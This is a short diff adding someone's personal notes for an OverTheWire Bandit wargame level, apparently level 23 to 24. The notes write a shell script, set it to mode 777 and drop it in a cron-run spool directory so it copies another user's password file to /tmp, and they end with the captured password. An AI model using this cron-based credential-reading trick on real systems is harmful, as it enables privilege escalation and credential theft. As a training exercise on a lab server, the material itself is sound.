@@ -1,0 +1,21 @@
+ssh bandit23@bandit.labs.overthewire.org -p 2220
+
+# see loophole in bandit22 for password or
+# make script to copy password to tmp foler (currently broken)
+
+mkdir /tmp/matt2
+cd /tmp/matt2
+vim script.sh
+
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 >> /tmp/matt2/level24-pass
+
+chmod 777 script.sh
+cp script.sh /var/spool/bandit24
+
+# wait a minute for cronjob to run
+cat level24-pass
+
+> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 
+
+Crl-D
